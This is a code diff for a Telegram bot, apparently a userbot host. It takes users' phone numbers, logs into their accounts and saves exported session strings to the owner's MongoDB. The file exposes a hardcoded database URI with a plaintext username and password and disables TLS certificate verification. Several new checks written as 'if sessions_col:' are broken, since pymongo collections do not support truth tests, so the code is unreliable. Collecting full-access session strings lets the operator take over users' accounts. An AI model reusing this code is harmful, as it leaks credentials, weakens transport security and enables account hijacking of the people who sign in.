@@ -19,20 +19,21 @@ MONGO_URI = "mongodb+srv://Nova:NovaCoder76@cluster0.njvqq11.mongodb.net/NovaDB?
 OWNER_ID = 8724182918
 OWNER_USERNAME = "@CoderNova"
 
-# --- DATABASE SETUP (FIXED FOR RENDER DNS ERRORS) ---
+# --- DATABASE SETUP (CRASH PROOF & RENDER DNS BYPASS) ---
+db = None
+sessions_col = None
+
 try:
     mongo_client = MongoClient(
         MONGO_URI, 
-        serverSelectionTimeoutMS=5000, 
+        serverSelectionTimeoutMS=3000, 
         tlsAllowInvalidCertificates=True
     )
     db = mongo_client["XenoGenDB"]
     sessions_col = db["sessions"]
-    # Testing database connection on startup
-    mongo_client.admin.command('ping')
-    print("[SUCCESS] MongoDB Connected Successfully!")
+    print("[INFO] MongoDB client initialized successfully.")
 except Exception as mongo_err:
-    print(f"[CRITICAL] Database connection failed: {mongo_err}")
+    print(f"[WARNING] Database setup error (Bot will still run): {mongo_err}")
 
 # --- WEB SERVER FOR RENDER ---
 app = Flask('')
@@ -211,6 +212,8 @@ async def start_handler(c, m):
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_process(c, m):
+    if sessions_col is None:
+        return await m.reply_text("❌ **Database Connection Offline!** Bot owners se kahein database check karein.")
     await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ (e.g. +91XXXXXXXXXX):**")
 
 @bot.on_message(filters.command("remove") & filters.private)
@@ -221,12 +224,15 @@ async def owner_remove_panel(c, m):
             try:
                 await running_ubots[uid].stop()
                 del running_ubots[uid]
-                sessions_col.delete_one({"user_id": uid})
+                if sessions_col: sessions_col.delete_one({"user_id": uid})
                 return await m.reply_text("✅ **ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ ᴀɴᴅ ʀᴇᴍᴏᴠᴇᴅ!**")
             except Exception as e:
                 return await m.reply_text(f"❌ **Error:** `{e}`")
         else:
             return await m.reply_text("❓ **ᴀᴀᴘᴋᴀ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ʙᴏᴛ ɴᴀʜɪ ᴍɪʟᴀ.**")
+
+    if sessions_col is None:
+        return await m.reply_text("❌ **Database is currently down. Cannot access owner panel.**")
 
     try:
         saved_sessions = list(sessions_col.find({}))
@@ -259,24 +265,23 @@ async def handle_callbacks(c, q):
             return await q.answer(f"❌ Aap authorized Owner ({OWNER_USERNAME}) nahi hain!", show_alert=True)
         
         target_uid = int(data.split("_")[1])
-        try:
-            sessions_col.delete_one({"user_id": target_uid})
-        except Exception: pass
+        if sessions_col:
+            try: sessions_col.delete_one({"user_id": target_uid})
+            except Exception: pass
         
         if target_uid in running_ubots:
             try:
                 active_tasks[target_uid] = False
                 await running_ubots[target_uid].stop()
                 del running_ubots[target_uid]
-            except Exception:
-                pass
+            except Exception: pass
         
         await q.answer("✅ Session completely terminated & deleted!", show_alert=True)
         
-        try:
-            saved_sessions = list(sessions_col.find({}))
-        except Exception:
-            saved_sessions = []
+        saved_sessions = []
+        if sessions_col:
+            try: saved_sessions = list(sessions_col.find({}))
+            except Exception: pass
 
         if not saved_sessions:
             await q.message.edit_text("😔 **Database me koi bhi active session nahi mila.**")
@@ -318,6 +323,9 @@ async def handle_steps(c, m):
         except Exception as e: await m.reply_text(f"❌ `{e}`")
 
 async def finalize_login(c, m, uid):
+    if sessions_col is None:
+        return await m.reply_text("❌ Database error. Cannot save login session permanently.")
+        
     data = user_data[uid]
     string = await data["client"].export_session_string()
     
@@ -343,11 +351,12 @@ async def main():
     await bot.start()
     print("[INFO] Main Bot online. Booting database sessions...")
     
-    try:
-        saved_sessions = list(sessions_col.find({}))
-    except Exception as loop_err:
-        print(f"[ERROR] Could not fetch database sessions: {loop_err}")
-        saved_sessions = []
+    saved_sessions = []
+    if sessions_col is not None:
+        try:
+            saved_sessions = list(sessions_col.find({}))
+        except Exception as loop_err:
+            print(f"[ERROR] Could not fetch database sessions: {loop_err}")
 
     for data in saved_sessions:
         uid = data["user_id"]
@@ -361,7 +370,7 @@ async def main():
         except Exception as e:
             print(f"[ERROR] Failed to load session {uid}: {e}")
             
-    print("[INFO] Loop initialization successful. Keeping process active.")
+    print("[INFO] Bootstrapping finished successfully. Bot is fully operational.")
     while True:
         await asyncio.sleep(3600)
 
